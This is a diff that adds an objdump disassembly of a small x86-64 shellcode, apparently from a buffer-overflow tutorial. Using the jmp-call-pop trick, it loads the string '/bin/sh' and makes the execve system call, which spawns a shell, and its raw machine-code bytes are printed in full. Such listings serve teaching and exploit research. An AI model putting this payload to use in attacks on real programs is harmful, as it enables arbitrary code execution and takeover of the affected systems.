@@ -1,0 +1,22 @@
+00000000004004aa <needle0>:
+  4004aa:	eb 0e                	jmp    4004ba <there>
+
+00000000004004ac <here>:
+  4004ac:	5f                   	pop    %rdi
+  4004ad:	48 31 c0             	xor    %rax,%rax
+  4004b0:	b0 3b                	mov    $0x3b,%al
+  4004b2:	48 31 f6             	xor    %rsi,%rsi
+  4004b5:	48 31 d2             	xor    %rdx,%rdx
+  4004b8:	0f 05                	syscall 
+
+00000000004004ba <there>:
+  4004ba:	e8 ed ff ff ff       	callq  4004ac <here>
+  4004bf:	2f                   	(bad)  
+  4004c0:	62                   	(bad)  
+  4004c1:	69                   	.byte 0x69
+  4004c2:	6e                   	outsb  %ds:(%rsi),(%dx)
+  4004c3:	2f                   	(bad)  
+  4004c4:	73 68                	jae    40052e <__libc_csu_init+0x4e>
+	...
+
+00000000004004c7 <needle1>:
